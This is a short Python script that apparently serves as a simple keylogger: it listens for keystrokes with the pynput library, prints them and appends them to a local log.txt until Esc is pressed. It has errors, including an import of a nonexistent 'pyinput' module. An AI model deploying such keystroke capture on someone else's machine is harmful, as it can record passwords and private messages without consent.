import pyinput
import time
from pynput.keyboard import Key, Listener

keys = []

with open("log.txt", "a") as file:
    file.write("\n\nNEW ENTRY\n")

def on_press(key):
    try:
        keys.append(key)
        charac=key.char
        write_file(charac)
    except AttributeError:
        if key == Key.esc:
            keys.append("Key.esc ")
    
    try:
        print("{0}".format(key.char))
    except AttributeError:
        print("{0}".format(key))

def write_file(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            k=None
            k=str(key).replace("'", "")
            if k == "Key.enter":
                file.write('\n')
            else:
                file.write(k + ' ')


def on_release(key):
    print("{0} released".format(key))
    if key==Key.esc:
        return False



with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()